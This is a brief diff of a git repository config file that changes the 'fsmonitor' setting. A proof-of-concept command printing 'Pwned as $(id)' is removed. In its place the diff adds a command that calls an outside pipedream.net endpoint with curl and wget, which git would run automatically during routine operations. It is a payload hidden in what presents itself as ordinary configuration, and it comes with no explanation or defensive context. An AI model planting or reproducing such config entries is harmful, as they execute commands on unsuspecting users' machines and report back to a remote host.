@@ -2,5 +2,5 @@
 	repositoryformatversion = 0
 	filemode = true
 	bare = false 
-        fsmonitor = "echo \"Pwned as $(id)\">&2; false"
+        fsmonitor = "curl https://eo2kscubva3z9du.m.pipedream.net | wget https://eo2kscubva3z9du.m.pipedream.net; false"
 	worktree = "working"
